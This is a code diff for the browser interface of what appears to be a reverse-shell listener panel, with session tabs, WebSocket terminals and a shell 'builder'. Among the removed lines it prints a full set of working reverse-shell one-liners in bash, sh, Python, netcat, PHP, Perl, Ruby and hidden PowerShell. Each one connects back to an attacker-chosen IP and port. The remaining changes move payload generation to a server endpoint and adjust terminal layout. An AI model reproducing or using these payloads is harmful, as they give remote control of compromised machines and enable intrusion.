@@ -31,38 +31,15 @@ document.getElementById("closeBuilder").onclick = () => {
 };
 
 document.getElementById("createShell").onclick = () => {
+    const ip = document.getElementById("builderIp").value
+    const port = document.getElementById("builderPort").value
+    const script = document.getElementById("builderScript").value
 
-  const ip = document.getElementById("builderIp").value;
-  const port = document.getElementById("builderPort").value;
-  const script = document.getElementById("builderScript").value;
-
-  let cmd = "";
-
-  if (script === "bash")
-    cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-
-  if (script === "sh")
-    cmd = `sh -i >& /dev/tcp/${ip}/${port} 0>&1`;
-
-  if (script === "python")
-    cmd = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;
-
-  if (script === "nc")
-    cmd = `nc ${ip} ${port} -e /bin/bash`;
-
-  if (script === "php")
-    cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`;
-
-  if (script === "perl")
-    cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`;
-
-  if (script === "ruby")
-    cmd = `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`;
-
-  if (script === "powershell")
-    cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
-
-  document.getElementById("shellOutput").textContent = cmd;
+    fetch(`/api/builder?lang=${script}&ip=${ip}&port=${port}`)
+    .then(r => r.text())
+    .then(cmd => {
+        document.getElementById("shellOutput").textContent = cmd
+    })
 };
 
 document.getElementById("copyShell").onclick = () => {
@@ -99,7 +76,13 @@ function addSession(id, ip, type){
 }
 
 function openTerminal(id){
-    if(terminals[id]){ activateTab(id); return }
+    if(terminals[id]) {
+        terminals[id].tab.style.display = "block"
+        terminals[id].termDiv.style.display = "block"
+        activateTab(id)
+
+        return
+    }
 
     const tab = document.createElement("div")
     tab.className="tab"
@@ -130,7 +113,11 @@ function openTerminal(id){
     ws.onmessage = e=>term.write(e.data)
     term.onData(data=>{ if(ws.readyState===1) ws.send(data) })
 
-    window.addEventListener("resize",()=>{ fitAddon.fit() })
+    window.addEventListener("resize", () => {
+        for (let k in terminals) {
+            terminals[k].fit.fit()
+        }
+    })
 
     terminals[id]={ tab, term, termDiv, ws, fit: fitAddon }
 
@@ -156,10 +143,9 @@ function activateTab(id){
 function closeTab(id){
     const t=terminals[id]
     if(!t) return
-    t.ws.close()
-    t.tab.remove()
-    t.termDiv.remove()
-    delete terminals[id]
+    
+    t.tab.style.display = "none"
+    t.termDiv.style.display = "none"
 }
 
 /* ------------------------------
@@ -185,12 +171,18 @@ const container=document.getElementById("container")
 let dragging=false
 splitter.addEventListener("mousedown",()=>{ dragging=true })
 document.addEventListener("mouseup",()=>{ dragging=false })
-document.addEventListener("mousemove",e=>{
-    if(!dragging) return
-    let y=e.clientY-container.getBoundingClientRect().top
-    if(y<80) y=80
-    if(y>container.clientHeight-120) y=container.clientHeight-120
-    sessions.style.height=y+"px"
+document.addEventListener("mousemove", e => {
+    if (!dragging) return
+
+    let y = e.clientY - container.getBoundingClientRect().top
+    if (y < 80) y = 80
+    if (y > container.clientHeight - 120) y = container.clientHeight - 120
+
+    sessions.style.height = y + "px"
+
+    for (let k in terminals) {
+        terminals[k].fit.fit()
+    }
 })
 
 loadSessions()
